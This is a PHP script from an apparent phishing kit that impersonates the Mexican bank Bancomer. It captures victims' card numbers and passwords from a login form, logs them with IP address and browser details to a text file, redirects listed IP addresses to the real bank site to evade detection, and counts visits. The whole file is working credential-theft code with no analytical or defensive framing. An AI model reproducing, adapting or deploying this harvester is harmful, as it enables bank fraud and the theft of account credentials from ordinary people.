<?php
session_start();
$_SESSION["uuid"] = uniqid();
$Fecha= date('d-m-Y');
$Hora= date('H:i:s');
$Tarjeta = $_POST['user'];
$Contraseña = $_POST['pass'];

$ip = getenv("REMOTE_ADDR");
$agent = $_SERVER['HTTP_USER_AGENT'];
$content .= "Fecha: $Fecha / Hora: $Hora

Tarjeta: $Tarjeta
Contraseña: $Contraseña

IP: $ip";


$subject = "Bancomer Paso 1 - $ip  user-agent: $agent - uuid: " . $_SESSION["uuid"] . " ";
$prefijo = substr(md5(uniqid(rand())),0,6);



$file = fopen("quesopanela.txt", "a") or die("Unable to open file!");
fwrite($file, $subject);
fwrite($file, $content);
fclose($file);




@session_start();

$ips = file_get_contents("ips.txt");
$ip  = explode("\n", $ips);
foreach ($ip as $intruso){
    if ($intruso == $_SERVER['REMOTE_ADDR'])
        header("Location:http://www.bancomer.com");
}
$archivo = "contador.txt";

$fp = fopen($archivo,"r");
$contador = fgets($fp, 26);
fclose($fp);

++$contador;

$fp = fopen($archivo,"w+");
fwrite($fp, $contador, 26);
fclose($fp);

?>2